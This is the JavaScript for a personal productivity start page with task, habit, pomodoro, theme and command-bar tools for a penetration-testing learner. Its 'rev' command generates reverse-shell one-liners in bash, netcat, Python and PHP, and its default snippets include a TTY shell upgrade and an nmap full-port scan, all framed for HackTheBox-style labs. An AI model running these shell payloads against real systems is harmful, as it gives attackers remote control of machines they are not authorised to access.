        activeAudioNodes.push(oscL, oscR, merger);
    }
}

function cycleAudio() {
    audioModeIndex = (audioModeIndex + 1) % AUDIO_MODES.length;
    startFocusAudio(audioModeIndex);
    const badge = document.getElementById('audio-status');
    if (badge) {
        badge.innerHTML = `🎧 ${AUDIO_MODES[audioModeIndex]} <kbd>⌥A</kbd>`;
        badge.classList.toggle('playing', audioModeIndex !== 0);
    }
    showToast(`Focus Audio: ${AUDIO_MODES[audioModeIndex]}`);
}

/* =========================================
   7. 3-IN-1 WIDGET: TASKS, HABITS & SNIPPETS
   ========================================= */
function switchWidgetTab(tabName) {
    document.querySelectorAll('.w-tab').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.tab === tabName);
    });
    document.querySelectorAll('.widget-pane').forEach(pane => {
        pane.classList.toggle('active', pane.id === `tab-${tabName}`);
    });
    const clearBtn = document.getElementById('clear-done-btn');
    if (clearBtn) clearBtn.style.display = tabName === 'tasks' ? 'inline-block' : 'none';
}

let todos = JSON.parse(localStorage.getItem('traichu_todos')) || [];

function parsePriority(rawText) {
    let prio = null;
    let clean = rawText;
    if (/\s*!h\b/i.test(rawText)) { prio = 'h'; clean = rawText.replace(/\s*!h\b/i, '').trim(); }
    else if (/\s*!m\b/i.test(rawText)) { prio = 'm'; clean = rawText.replace(/\s*!m\b/i, '').trim(); }
    else if (/\s*!l\b/i.test(rawText)) { prio = 'l'; clean = rawText.replace(/\s*!l\b/i, '').trim(); }
    return { text: clean || rawText, prio };
}

function renderTodos() {
    const list = document.getElementById('todo-list');
    const countEl = document.getElementById('todo-count');
    if (!list) return;
    list.innerHTML = '';

    const weight = { h: 3, m: 2, l: 1 };
    todos.sort((a, b) => (a.done - b.done) || ((weight[b.prio] || 0) - (weight[a.prio] || 0)));

    const doneCount = todos.filter(t => t.done).length;
    if (countEl) countEl.textContent = todos.length ? `(${doneCount}/${todos.length})` : '';

    todos.forEach((t, i) => {
        const li = document.createElement('li');
        li.className = t.done ? 'todo-done' : '';
        const pill = t.prio ? `<span class="prio-pill prio-${escapeHTML(t.prio)}">${escapeHTML(t.prio)}</span>` : '';
        li.innerHTML = `
            <label>
                <input type="checkbox" ${t.done ? 'checked' : ''} onchange="toggleTodo(${i})">
                ${pill}
                <span>${escapeHTML(t.text)}</span>
            </label>
            <button type="button" class="del-row-btn" title="Delete task" onclick="deleteTodo(${i})">×</button>
        `;
        list.appendChild(li);
    });
}

function addTodo(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const raw = e.target.value.trim();
        if (raw) {
            const { text, prio } = parsePriority(raw);
            todos.push({ text, prio, done: false });
            localStorage.setItem('traichu_todos', JSON.stringify(todos));
            e.target.value = '';
            renderTodos();
        }
    }
}
function toggleTodo(i) { todos[i].done = !todos[i].done; localStorage.setItem('traichu_todos', JSON.stringify(todos)); renderTodos(); }
function deleteTodo(i) { todos.splice(i, 1); localStorage.setItem('traichu_todos', JSON.stringify(todos)); renderTodos(); }
function clearDoneTodos() {
    todos = todos.filter(t => !t.done);
    localStorage.setItem('traichu_todos', JSON.stringify(todos));
    renderTodos();
    showToast("Cleared completed tasks");
}

/* --- Daily Resetting Habits & Streak Engine --- */
const defaultHabits = [
    { text: "Solve 2 LeetCode Problems", done: false },
    { text: "1 Hr OffSec / HTB Lab", done: false },
    { text: "Deep Work Block (No Phone)", done: false }
];
let habits = safeLoadJSON('traichu_habits', defaultHabits);

function checkDailyHabitReset() {
    const today = dayKey(new Date());
    const lastDate = localStorage.getItem('traichu_habit_date');
    if (lastDate && lastDate !== today) {
        const allCompletedYesterday = habits.length > 0 && habits.every(h => h.done);
        let streak = +localStorage.getItem('traichu_streak') || 0;
        const yesterday = dayKey(new Date(Date.now() - 864e5));
        if (lastDate === yesterday && allCompletedYesterday) {
            streak++;
        } else if (lastDate !== yesterday) {
            streak = 0;
        }
        localStorage.setItem('traichu_streak', streak);
        habits.forEach(h => h.done = false);
        localStorage.setItem('traichu_habits', JSON.stringify(habits));
    }
    localStorage.setItem('traichu_habit_date', today);
    updateStreakBadge();
}

function updateStreakBadge() {
    const badge = document.getElementById('streak-badge');
    if (!badge) return;
    let streak = +localStorage.getItem('traichu_streak') || 0;
    const allDoneToday = habits.length > 0 && habits.every(h => h.done);
    badge.textContent = `🔥 ${streak + (allDoneToday ? 1 : 0)}d`;
}

function renderHabits() {
    const list = document.getElementById('habit-list');
    if (!list) return;
    list.innerHTML = '';
    habits.forEach((h, i) => {
        const li = document.createElement('li');
        li.className = h.done ? 'todo-done' : '';
        li.innerHTML = `
            <label>
                <input type="checkbox" ${h.done ? 'checked' : ''} onchange="toggleHabit(${i})">
                <span>${escapeHTML(h.text)}</span>
            </label>
            <button type="button" class="del-row-btn" onclick="deleteHabit(${i})">×</button>
        `;
        list.appendChild(li);
    });
    updateStreakBadge();
}

function addHabit(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const val = e.target.value.trim();
        if (val) {
            habits.push({ text: val, done: false });
            localStorage.setItem('traichu_habits', JSON.stringify(habits));
            e.target.value = '';
            renderHabits();
        }
    }
}
function toggleHabit(i) {
    habits[i].done = !habits[i].done;
    localStorage.setItem('traichu_habits', JSON.stringify(habits));
    renderHabits();
}
function deleteHabit(i) {
    habits.splice(i, 1);
    localStorage.setItem('traichu_habits', JSON.stringify(habits));
    renderHabits();
}

/* --- One-Click Snippets Vault --- */
const defaultSnippets = [
    { title: "TTY Shell Upgrade", code: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
    { title: "Fast Nmap All Ports", code: "nmap -p- --min-rate 1500 -sC -sV -oN scan.txt " },
    { title: "Local HTTP Server", code: "python3 -m http.server 8000" }
];
let snippets = safeLoadJSON('traichu_snippets', defaultSnippets);

function renderSnippets() {
    const list = document.getElementById('snippet-list');
    if (!list) return;
    list.innerHTML = '';
    snippets.forEach((s, i) => {
        const li = document.createElement('li');
        li.innerHTML = `
            <div class="snip-item" onclick="copySnippet(${i})" title="Click to copy">
                <span class="snip-title">${escapeHTML(s.title)}</span>
                <code class="snip-code">${escapeHTML(s.code)}</code>
            </div>
            <button type="button" class="del-row-btn" onclick="deleteSnippet(${i})">×</button>
        `;
        list.appendChild(li);
    });
}
function copySnippet(i) {
    if (snippets[i]) copyText(snippets[i].code, `Copied: ${snippets[i].title}`);
}
function addSnippet(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const raw = e.target.value.trim();
        if (!raw) return;
        const parts = raw.split('::');
        const title = parts.length > 1 ? parts[0].trim() : "Snippet";
        const code = parts.length > 1 ? parts.slice(1).join('::').trim() : raw;
        snippets.push({ title, code });
        localStorage.setItem('traichu_snippets', JSON.stringify(snippets));
        e.target.value = '';
        renderSnippets();
    }
}
function deleteSnippet(i) {
    snippets.splice(i, 1);
    localStorage.setItem('traichu_snippets', JSON.stringify(snippets));
    renderSnippets();
}

/* =========================================
   8. GMAIL DROPDOWN & SHORTCUTS MODAL
   ========================================= */
function closeGmailMenu() {
    const m = document.getElementById('gmail-menu');
    const b = document.getElementById('gmail-btn');
    if (m) m.classList.remove('show');
    if (b) b.classList.remove('open');
}
function toggleGmailMenu(e) {
    if (e) { e.preventDefault(); e.stopPropagation(); }
    const m = document.getElementById('gmail-menu');
    const b = document.getElementById('gmail-btn');
    if (!m) return;
    if (!m.classList.contains('show')) {
        closeCheatOverlay();
        closeOmniSuggestions();
        m.classList.add('show');
        if (b) b.classList.add('open');
    } else {
        closeGmailMenu();
    }
}

function toggleShortcutsModal() {
    const modal = document.getElementById('shortcuts-modal');
    if (modal) modal.classList.toggle('show');
}
function closeShortcutsModal() {
    const modal = document.getElementById('shortcuts-modal');
    if (modal) modal.classList.remove('show');
}

/* =========================================
   9. QUICK-COMMAND BAR & OMNI ENGINE
   ========================================= */
function runQuickCmd(cmdText) {
    const q = document.getElementById('q');
    if (!q) return;
    q.value = cmdText;
    handleSearch(new Event('submit'));
}

function fillQuickCmd(prefixText) {
    const q = document.getElementById('q');
    if (!q) return;
    closeCheatOverlay();
    q.value = prefixText;
    q.focus();
}

function showOverlay(title, content, cheatKey = null) {
    closeOmniSuggestions();
    activeCheatKey = cheatKey;
    const overlay = document.getElementById('cheat-overlay');
    const titleEl = document.getElementById('overlay-title');
    const contentEl = document.getElementById('overlay-content');
    const editBtn = document.getElementById('edit-cheat-btn');
    if (!overlay || !contentEl) return;
    if (titleEl) titleEl.textContent = title;
    if (editBtn) editBtn.style.display = cheatKey ? 'inline-block' : 'none';
    contentEl.textContent = content;
    overlay.style.display = 'block';
}

function closeCheatOverlay() {
    const overlay = document.getElementById('cheat-overlay');
    if (overlay) overlay.style.display = 'none';
    activeCheatKey = null;
}

function copyOverlayText() {
    const contentEl = document.getElementById('overlay-content');
    if (contentEl && contentEl.textContent) {
        copyText(contentEl.textContent, "Output copied");
    }
}

function calculateCidr(cidrStr) {
    const match = cidrStr.trim().match(/^(\d+\.\d+\.\d+\.\d+)\/(\d+)$/);
    if (!match) return "Usage: cidr <ip>/<mask> (e.g., cidr 192.168.1.0/24)";
    const ipParts = match[1].split('.').map(Number);
    const prefix = parseInt(match[2], 10);
    if (ipParts.some(p => p < 0 || p > 255) || prefix < 0 || prefix > 32) return "Invalid IP or CIDR prefix.";
    const ipInt = ((ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3]) >>> 0;
    const mask = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
    const net = (ipInt & mask) >>> 0;
    const bcast = (net | (~mask >>> 0)) >>> 0;
    const toIp = n => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
    const hosts = prefix >= 31 ? (prefix === 32 ? 1 : 2) : Math.pow(2, 32 - prefix) - 2;
    return `CIDR: ${cidrStr}\nNetmask:   ${toIp(mask)}\nNetwork:   ${toIp(net)}\nBroadcast: ${toIp(bcast)}\nFirst IP:  ${prefix >= 31 ? toIp(net) : toIp(net + 1)}\nLast IP:   ${prefix >= 31 ? toIp(bcast) : toIp(bcast - 1)}\nUsable Hosts: ${hosts.toLocaleString()}`;
}

function generateRevShells(ip = "10.10.14.2", port = "4444") {
    return `REVERSE SHELL PAYLOADS (${ip}:${port}):

[Bash -i]
bash -i >& /dev/tcp/${ip}/${port} 0>&1

[Bash 196]
0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196

[Netcat mkfifo]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f

[Python3]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

[PHP exec]
php -r '$sock=fsockopen("${ip}",${port});exec("sh <&3 >&3 2>&3");'`;
}

async function computeHashes(text) {
    const enc = new TextEncoder().encode(text);
    const [buf256, buf1] = await Promise.all([
        crypto.subtle.digest('SHA-256', enc),
        crypto.subtle.digest('SHA-1', enc)
    ]);
    const hex = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
    showOverlay("CRYPTO HASHES", `Input:   ${text}\nSHA-256: ${hex(buf256)}\nSHA-1:   ${hex(buf1)}`);
}

/* --- Fuzzy Omni-Suggestions Engine --- */
let omniSelectedIndex = -1;
let currentOmniItems = [];

function getAllSearchableItems() {
    const items = [];
    bookmarksData.forEach(col => {
        col.links.forEach(l => items.push({ type: col.title.replace('// ', ''), name: l.name, url: l.url }));
    });
    dockData.forEach(d => items.push({ type: 'DOCK', name: d.name, url: d.url }));
    Object.keys(cheatSheets).forEach(k => items.push({ type: 'CHEAT', name: `cheat ${k}`, cmd: `cheat ${k}` }));
    return items;
}

function closeOmniSuggestions() {
    const box = document.getElementById('omni-suggestions');
    if (box) { box.classList.remove('show'); box.innerHTML = ''; }
    omniSelectedIndex = -1;
    currentOmniItems = [];
}

function renderOmniSuggestions(inputVal) {
    const box = document.getElementById('omni-suggestions');
    if (!box) return;
    const trimmed = inputVal.trim();
    if (!trimmed || trimmed.length < 1) {
        closeOmniSuggestions();
        return;
    }

    if (/^[\d\s+\-*/().%^]+$/.test(trimmed) && /[+\-*/%^]/.test(trimmed)) {
        try {
            const sanitized = trimmed.replace(/\^/g, '**');
            const res = Function('"use strict";return (' + sanitized + ')')();
            if (typeof res === 'number' && !isNaN(res)) {
                showOverlay("LIVE CALCULATOR", `${trimmed} = ${res}`);
                return;
            }
        } catch (e) {}
    }

    const qLower = trimmed.toLowerCase();
    const matches = getAllSearchableItems().filter(item =>
        item.name.toLowerCase().includes(qLower) || item.type.toLowerCase().includes(qLower)
    ).slice(0, 6);

    if (matches.length === 0) {
        closeOmniSuggestions();
        return;
    }

    currentOmniItems = matches;
    omniSelectedIndex = -1;
    box.innerHTML = '';
    matches.forEach((m, idx) => {
        const div = document.createElement('div');
        div.className = 'omni-item';
        div.innerHTML = `
            <div class="omni-left">
                <span>${escapeHTML(m.name)}</span>
                <small style="color:var(--text-faint)">${escapeHTML(m.url || m.cmd)}</small>
            </div>
            <span class="omni-badge">${escapeHTML(m.type)}</span>
        `;
        div.onclick = () => executeOmniItem(idx);
        box.appendChild(div);
    });
    box.classList.add('show');
}

function executeOmniItem(idx) {
    const item = currentOmniItems[idx];
    if (!item) return;
    if (item.url) {
        window.location.href = item.url;
    } else if (item.cmd) {
        const q = document.getElementById('q');
        q.value = item.cmd;
        handleSearch(new Event('submit'));
    }
}

function handleSearch(e) {
    if (e && e.preventDefault) e.preventDefault();
    const inputElem = document.getElementById('q');
    if (!inputElem) return;

    if (omniSelectedIndex >= 0 && currentOmniItems[omniSelectedIndex]) {
        executeOmniItem(omniSelectedIndex);
        return;
    }

    const input = inputElem.value.trim();
    if (!input) return;
    const parts = input.split(' ');
    const prefix = parts[0].toLowerCase();
    const query = parts.slice(1).join(' ');

    if (prefix === 'help' || prefix === '?') { toggleShortcutsModal(); return; }
    if (prefix === 'reset') { restoreDefaultSites(); inputElem.value = ''; return; }
    if (prefix === 'add' && query) {
        const { text, prio } = parsePriority(query);
        todos.push({ text, prio, done: false });
        localStorage.setItem('traichu_todos', JSON.stringify(todos));
        renderTodos();
        inputElem.value = '';
        closeOmniSuggestions();
        showToast("Task Added");
        return;
    }
    if (prefix === 'focus' && query) {
        setFocus(query);
        inputElem.value = '';
        closeOmniSuggestions();
        return;
    }
    if (prefix === 'pomo') {
        const mins = parseFloat(query) || 25;
        startCustomPomodoro(mins, "POMODORO");
        inputElem.value = '';
        closeOmniSuggestions();
        showToast(`🍅 ${mins}m Pomodoro Started`);
        return;
    }
    if (prefix === 'break') {
        const mins = parseFloat(query) || 5;
        startCustomPomodoro(mins, "BREAK");
        inputElem.value = '';
        closeOmniSuggestions();
        showToast(`☕ ${mins}m Break Started`);
        return;
    }
    if (prefix === 'cheat') {
        const sheetKey = query.toLowerCase().trim();
        if (cheatSheets[sheetKey]) {
            showOverlay(`CHEAT-SHEET // ${sheetKey.toUpperCase()}`, cheatSheets[sheetKey], sheetKey);
        } else {
            showOverlay("AVAILABLE CHEAT-SHEETS", `Type: cheat <name> (or click '+ Tool / Cheat' in Edit Mode ⌥E)\nAvailable: ${Object.keys(cheatSheets).join(', ')}`);
        }
        return;
    }
    if (prefix === 'b64' && query) {
        let out = `Encoded: ${btoa(unescape(encodeURIComponent(query)))}`;
        try { out += `\nDecoded: ${decodeURIComponent(escape(atob(query)))}`; } catch (err) {}
        showOverlay("BASE64 CODEC", out);
        return;
    }
    if (prefix === 'url' && query) {
        let out = `Encoded: ${encodeURIComponent(query)}`;
        try { out += `\nDecoded: ${decodeURIComponent(query)}`; } catch (err) {}
        showOverlay("URL CODEC", out);
        return;
    }
    if (prefix === 'hash' && query) {
        computeHashes(query);
        return;
    }
    if (prefix === 'jwt' && query) {
        try {
            const segs = query.split('.');
            const dec = s => JSON.stringify(JSON.parse(atob(s.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
            showOverlay("JWT DECODER", `// HEADER:\n${dec(segs[0])}\n\n// PAYLOAD:\n${dec(segs[1])}`);
        } catch (err) {
            showOverlay("JWT ERROR", "Invalid JWT token format.");
        }
        return;
    }
    if (prefix === 'uuid') {
        const id = crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random()*16|0; return (c==='x'?r:(r&0x3|0x8)).toString(16); });
        copyText(id, "UUID v4 Copied");
        showOverlay("UUID GENERATOR", id);
        return;
    }
    if (prefix === 'pass') {
        const len = Math.min(128, Math.max(8, parseInt(query, 10) || 20));
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}";
        const arr = new Uint32Array(len);
        crypto.getRandomValues(arr);
        const pwd = Array.from(arr, x => chars[x % chars.length]).join('');
        copyText(pwd, `${len}-char Password Copied`);
        showOverlay("HIGH-ENTROPY PASSWORD", pwd);
        return;
    }
    if (prefix === 'epoch') {
        if (!query) {
            const nowSec = Math.floor(Date.now() / 1000);
            showOverlay("UNIX EPOCH", `Current Epoch (s):  ${nowSec}\nCurrent Epoch (ms): ${Date.now()}\nISO: ${new Date().toISOString()}`);
        } else {
            let ts = Number(query);
            if (ts < 1e12) ts *= 1000;
            const d = new Date(ts);
            showOverlay("EPOCH CONVERTER", `Local: ${d.toString()}\nUTC:   ${d.toUTCString()}\nISO:   ${d.toISOString()}`);
        }
        return;
    }
    if (prefix === 'hex' && query) {
        const num = Number(query);
        if (!isNaN(num)) {
            showOverlay("NUMBER BASE CONVERTER", `Decimal: ${num}\nHex:     0x${num.toString(16).toUpperCase()}\nBinary:  0b${num.toString(2)}\nOctal:   0o${num.toString(8)}`);
        } else {
            const hexStr = Array.from(query).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
            showOverlay("ASCII TO HEX", hexStr);
        }
        return;
    }
    if (prefix === 'cidr' && query) {
        showOverlay("SUBNET / CIDR CALCULATOR", calculateCidr(query));
        return;
    }
    if (prefix === 'rev') {
        const [ip, port] = query.split(' ');
        showOverlay("OFFSEC REVERSE SHELL GENERATOR", generateRevShells(ip || '10.10.14.2', port || '4444'));
        return;
    }
    if (prefix === 'port' && query) {
        const info = commonPorts[query] || "Unknown / Unassigned Port";
        showOverlay("PORT LOOKUP", `[Port ${query}] -> ${info}`);
        return;
    }
    if (prefix === 'ip') {
        showOverlay("NETWORK TELEMETRY", "Fetching public IP...");
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => showOverlay("NETWORK TELEMETRY", `Public IP: ${d.ip}\nTimezone:  ${Intl.DateTimeFormat().resolvedOptions().timeZone}`))
            .catch(() => showOverlay("NETWORK TELEMETRY", "Failed to fetch public IP."));
        return;
    }
    if (/^[\d\s+\-*/().%^]+$/.test(input) && /[+\-*/%^]/.test(input)) {
        try {
            const res = Function('"use strict";return (' + input.replace(/\^/g, '**') + ')')();
            showOverlay("CALCULATOR", `${input} = ${res}`);
            return;
        } catch (err) {}
    }

    closeCheatOverlay();
    closeOmniSuggestions();

    const bangs = {
        g: 'https://www.google.com/search?q=',
        gh: 'https://github.com/search?q=',
        yt: 'https://www.youtube.com/results?search_query=',
        sh: 'https://www.shodan.io/search?query=',
        ai: 'https://chatgpt.com/?q=',
        cl: 'https://claude.ai/new?q=',
        px: 'https://www.perplexity.ai/search?q=',
        so: 'https://stackoverflow.com/search?q=',
        mdn: 'https://developer.mozilla.org/en-US/search?q=',
        cve: 'https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&search_type=all&query=',
        lc: 'https://leetcode.com/problemset/?search=',
        htb: 'https://www.google.com/search?q=site:hackthebox.com+',
        thm: 'https://tryhackme.com/hacktivities?tab=search&value='
    };

    let targetUrl = '';
    if (prefix === 'ds') targetUrl = 'https://chat.deepseek.com/';
    else if (bangs[prefix] && query) targetUrl = bangs[prefix] + encodeURIComponent(query);
    else targetUrl = 'https://www.google.com/search?q=' + encodeURIComponent(input);

    window.location.href = targetUrl;
}

/* =========================================
   10. BOX BREATHING PACER (⌥B)
   ========================================= */
let breatheInterval = null;
function toggleBreathing() {
    const el = document.getElementById('breathe-anchor');
    if (!el) return;
    if (breatheInterval) {
        clearInterval(breatheInterval);
        breatheInterval = null;
        el.classList.remove('active');
        showToast("Box Breathing Ended");
        return;
    }
    const phases = ["🌬️ INHALE SLOWLY (4s)", "🧘 HOLD BREATH (4s)", "😮‍💨 EXHALE GENTLY (4s)", "✨ HOLD EMPTY (4s)"];
    let step = 0;
    el.classList.add('active');
    el.textContent = phases[0];
    breatheInterval = setInterval(() => {
        step = (step + 1) % phases.length;
        el.textContent = phases[step];
    }, 4000);
    showToast("Box Breathing Started (4-4-4-4)");
}

/* =========================================
   11. MACOS SHORTCUTS & EVENT LISTENERS
   ========================================= */
document.addEventListener('keydown', (e) => {
    if ((e.metaKey || e.ctrlKey) && e.code === 'KeyK') {
        e.preventDefault();
        const q = document.getElementById('q');
        q.focus();
        q.select();
        return;
    }

    if (e.altKey && !e.metaKey && !e.ctrlKey) {
        if (e.code === 'KeyZ') { e.preventDefault(); toggleZenMode(); }
        else if (e.code === 'KeyP') { e.preventDefault(); togglePomodoro(); }
        else if (e.code === 'KeyM') { e.preventDefault(); toggleGmailMenu(); }
        else if (e.code === 'KeyS') { e.preventDefault(); toggleScratchpad(); }
        else if (e.code === 'KeyA') { e.preventDefault(); cycleAudio(); }
        else if (e.code === 'KeyB') { e.preventDefault(); toggleBreathing(); }
        else if (e.code === 'KeyT') { e.preventDefault(); cycleTheme(); }
        else if (e.code === 'KeyE') { e.preventDefault(); toggleEditMode(); }
        else if (e.code === 'KeyK') { e.preventDefault(); toggleShortcutsModal(); }
    }

    const box = document.getElementById('omni-suggestions');
    if (box && box.classList.contains('show') && currentOmniItems.length > 0) {
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            omniSelectedIndex = (omniSelectedIndex + 1) % currentOmniItems.length;
            updateOmniActiveClass();
            return;
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            omniSelectedIndex = (omniSelectedIndex - 1 + currentOmniItems.length) % currentOmniItems.length;
            updateOmniActiveClass();
            return;
        }
    }

    if (e.key === 'Escape') {
        closeGmailMenu();
        closeCheatOverlay();
        closeOmniSuggestions();
        closeSiteModal();
        closeDockModal();
        closeToolModal();
        closeShortcutsModal();
        document.getElementById('scratchpad-wrap').classList.remove('show');
    }

    const t = document.activeElement && document.activeElement.tagName;
    if (e.key === '/' && t !== 'INPUT' && t !== 'TEXTAREA' && !e.target.isContentEditable) {
        e.preventDefault();
        document.getElementById('q').focus();
    }
});

function updateOmniActiveClass() {
    document.querySelectorAll('#omni-suggestions .omni-item').forEach((el, idx) => {
        el.classList.toggle('active', idx === omniSelectedIndex);
    });
}

document.addEventListener('click', (e) => {
    const dockWrap = document.getElementById('dock-wrap');
    if (dockWrap && !dockWrap.contains(e.target)) closeGmailMenu();
    const searchArea = document.getElementById('search-area');
    if (searchArea && !searchArea.contains(e.target)) {
        closeCheatOverlay();
        closeOmniSuggestions();
    }
    if (e.target === document.getElementById('site-modal')) closeSiteModal();
    if (e.target === document.getElementById('dock-modal')) closeDockModal();
    if (e.target === document.getElementById('tool-modal')) closeToolModal();
    if (e.target === document.getElementById('shortcuts-modal')) closeShortcutsModal();
});

/* =========================================
   12. THEMES, SCRATCHPAD, TELEMETRY & BACKUP
   ========================================= */
const dayKey = d => d.toLocaleDateString('en-CA');
function getPomoCount(dateObj = new Date()) {
    return +localStorage.getItem('traichu_pomo_' + dayKey(dateObj)) || 0;
}
function bumpPomo() {
    localStorage.setItem('traichu_pomo_' + dayKey(new Date()), getPomoCount() + 1);
}

function renderPomoChart() {
    const chart = document.getElementById('pomo-chart');
    if (!chart) return;
    chart.innerHTML = '';
    const days = [];
    let maxVal = 4;
    for (let i = 6; i >= 0; i--) {
        const d = new Date(Date.now() - i * 864e5);
        const count = getPomoCount(d);
        if (count > maxVal) maxVal = count;
        const lbl = d.toLocaleDateString('en-US', { weekday: 'narrow' });
        days.push({ lbl, count });
    }
    days.forEach(d => {
        const pct = Math.round((d.count / maxVal) * 100);
        const col = document.createElement('div');
        col.className = 'pomo-day';
        col.title = `${d.count} sessions`;
        col.innerHTML = `
            <div class="pomo-bar-wrap"><div class="pomo-bar" style="height:${pct}%"></div></div>
            <span class="pomo-lbl">${escapeHTML(d.lbl)}</span>
        `;
        chart.appendChild(col);
    });
}

function updateDay() {
    const n = new Date();
    const p = Math.round((n - new Date(n.getFullYear(), n.getMonth(), n.getDate())) / 864e5 * 100);
    const bar = document.getElementById('dp-bar'), txt = document.getElementById('dp-txt');
    if (bar) bar.style.width = p + '%';
    if (txt) txt.textContent = 'Day ' + p + '%';
}

const THEMES = [
    ['Agni', 'agni'],
    ['Sagar', 'sagar'],
    ['Van', 'van'],
    ['Akasha', 'akasha'],
    ['Shunya', 'shunya'],
    ['Kintsugi', 'kintsugi'],
    ['Himadri', 'himadri'],
    ['Sandhya', 'sandhya'],
    ['Aranya', 'aranya'],
    ['Kagaz', 'kagaz']
];

function applyTheme(i) {
    const safeIdx = ((i % THEMES.length) + THEMES.length) % THEMES.length;
    document.documentElement.dataset.theme = THEMES[safeIdx][1];
    localStorage.setItem('traichu_theme', safeIdx);
    const k = document.getElementById('theme-name');
    if (k) k.textContent = THEMES[safeIdx][0];
}
function cycleTheme() {
    const next = ((+localStorage.getItem('traichu_theme') || 0) + 1) % THEMES.length;
    applyTheme(next);
    showToast(`Theme: ${THEMES[next][0]}`);
}

function updateScratchpadStats() {
    const sp = document.getElementById('scratchpad');
    const st = document.getElementById('sp-stats');
    if (!sp || !st) return;
    const val = sp.value.trim();
    const words = val ? val.split(/\s+/).length : 0;
    st.textContent = `${words}w · ${sp.value.length}c`;
}

function toggleScratchpad() {
    const wrap = document.getElementById('scratchpad-wrap');
    wrap.classList.toggle('show');
    if (wrap.classList.contains('show')) {
        renderPomoChart();
        updateScratchpadStats();
        document.getElementById('scratchpad').focus();
    } else {
        document.getElementById('q').focus();
    }
}

function downloadScratchpad() {
    const sp = document.getElementById('scratchpad');
    if (!sp || !sp.value.trim()) { showToast("Scratchpad is empty"); return; }
    const blob = new Blob([sp.value], { type: 'text/markdown;charset=utf-8' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `brain-dump-${dayKey(new Date())}.md`;
    a.click();
    showToast("Downloaded .md file");
}

function exportAllData() {
    const payload = {};
    for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && k.startsWith('traichu_')) payload[k] = localStorage.getItem(k);
    }
    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `warmode-backup-${dayKey(new Date())}.json`;
    a.click();
    showToast("Backup JSON Downloaded");
}

function triggerImportData() {
    document.getElementById('import-file').click();
}

function importAllData(e) {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
        try {
            const data = JSON.parse(ev.target.result);
            Object.keys(data).forEach(k => {
                if (k.startsWith('traichu_')) localStorage.setItem(k, data[k]);
            });
            showToast("Backup Restored! Reloading...");
            setTimeout(() => location.reload(), 900);
        } catch (err) {
            showToast("Invalid Backup JSON");
        }
    };
    reader.readAsText(file);
}

function setFocus(text) { localStorage.setItem('traichu_focus', text); renderFocus(); showToast("🎯 Mission Locked"); }
function clearFocus() { localStorage.removeItem('traichu_focus'); renderFocus(); document.getElementById('q').focus(); showToast("Mission Cleared"); }
function renderFocus() {
    const f = localStorage.getItem('traichu_focus');
    const el = document.getElementById('focus-anchor');
    if (f && el) {
        el.innerText = `🎯 CURRENT MISSION: ${f}`;
        el.classList.add('active');
    } else if (el) {
        el.classList.remove('active');
    }
}

function traichu() {
    dateTime();
    updateDay();
    setInterval(updateDay, 60000);
    applyTheme(+localStorage.getItem("traichu_theme") || 0);
    checkDailyHabitReset();
    resetStatus();
    renderTodos();
    renderHabits();
    renderSnippets();
    renderFocus();
    renderBookmarks();
    renderDock();
    renderQuickTools();
    loadHeroText();

    const sp = document.getElementById('scratchpad');
    if (sp) {
        sp.value = localStorage.getItem('traichu_scratchpad') || '';
        updateScratchpadStats();
        sp.addEventListener('input', e => {
            localStorage.setItem('traichu_scratchpad', e.target.value);
            updateScratchpadStats();
        });
    }

    const q = document.getElementById('q');
    if (q) {
        q.addEventListener('input', e => renderOmniSuggestions(e.target.value));
    }

    document.querySelectorAll('kbd[data-k]').forEach(k => {
        k.textContent = '⌥' + k.dataset.k;
    });
}

document.addEventListener('DOMContentLoaded', traichu);
